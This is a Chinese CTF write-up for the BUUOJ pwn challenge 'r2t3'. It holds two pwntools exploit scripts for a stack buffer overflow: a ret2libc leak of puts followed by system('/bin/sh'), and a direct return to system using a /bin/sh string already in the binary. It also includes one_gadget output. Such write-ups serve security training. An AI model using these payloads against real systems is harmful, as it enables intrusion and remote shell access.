# r2t3

保护只开了NX

![ESZnzS](https://gitee.com/p0kerface/blog_image_management/raw/master/uPic/ESZnzS.png)

漏洞点

![VY0Vw6](https://gitee.com/p0kerface/blog_image_management/raw/master/uPic/VY0Vw6.png)

一开始用ROP leak地址。。。结果不知道为啥，只能溢出一次。。。第二次输入长度就是不对。。。

而且第一次溢出也有点问题，不清楚自己是怎么绕过的。。

 ```python
#!/usr/bin/python
from pwn import *


p=process("r2t3.dms")
#p=remote("node3.buuoj.cn",25088)
context.log_level='Debug'
gdb.attach(p,'b *0x80485E1') #,'b *0x80485E1'
#libc=ELF('libc-2.29-2.so')
libc=ELF('/lib/i386-linux-gnu/libc-2.23.so')
BIN=ELF('r2t3.dms')

main=0x804863B
system_plt=BIN.plt['system']
puts_plt=BIN.plt['puts']
puts_got=BIN.got['puts']
puts_offset=libc.symbols['puts']

print "system_plt"+hex(system_plt)
print "puts_plt"+hex(puts_plt)
print "puts_got"+hex(puts_got)
print "puts"+hex(puts_offset)
payload="A"*(0x19-4)+p32(puts_plt)+p32(main)+p32(puts_got)
p.sendline(payload+"A"*(0x400-0x28))
#p.recv(0x487) local
p.recvuntil("AAA\n")
p.recv(0x1a+8)

leak=u32(p.recv(4))
libc_addr=leak-puts_offset
print "leak="+hex(leak)
print "libc="+hex(libc_addr)


#p.recvuntil("Please input your name:")
binsh= next(libc.search('/bin/sh\x00'))
binsh=libc_addr+binsh
print "binsh="+hex(binsh)
#p.sendline(payload+"A"*(0x400-0x28))
p.sendline("A"*(0x19-4)+p32(system_plt)+p32(main)+p32(binsh)+"A"*(0x300-0x20))
#p.sendline("A"*0x3f9)

#p.sendline("A"*0x280)
#one_gadget=0x106ef8+libc_addr

p.interactive()

'''

$ one_gadget libc-2.29.so 
0xe237f execve("/bin/sh", rcx, [rbp-0x70])
constraints:
  [rcx] == NULL || rcx == NULL
  [[rbp-0x70]] == NULL || [rbp-0x70] == NULL

0xe2383 execve("/bin/sh", rcx, rdx)
constraints:
  [rcx] == NULL || rcx == NULL
  [rdx] == NULL || rdx == NULL

0xe2386 execve("/bin/sh", rsi, rdx)
constraints:
  [rsi] == NULL || rsi == NULL
  [rdx] == NULL || rdx == NULL

0x106ef8 execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL

'''
 ```

后来发现/bin/sh地址在ELF里就有。。。浪费了好多时间

```python
#!/usr/bin/python
from pwn import *


#p=process("r2t3.dms")
p=remote("node3.buuoj.cn",25088)
context.log_level='Debug'
#gdb.attach(p,'b *0x8048615') #,'b *0x80485E1'
libc=ELF('libc-2.29-2.so')
#libc=ELF('/lib/i386-linux-gnu/libc-2.23.so')
BIN=ELF('r2t3.dms')

main=0x804863B
system_plt=BIN.plt['system']
#puts_plt=BIN.plt['puts']
#puts_got=BIN.got['puts']
#puts_offset=libc.symbols['puts']
print "system_plt"+hex(system_plt)

binsh=0x8048760
payload="A"*(0x19-4)+p32(system_plt)+p32(main)+p32(binsh)
p.sendline(payload+"A"*(0x400-0x28))

p.interactive()
```



![UZeJVr](https://gitee.com/p0kerface/blog_image_management/raw/master/uPic/UZeJVr.png)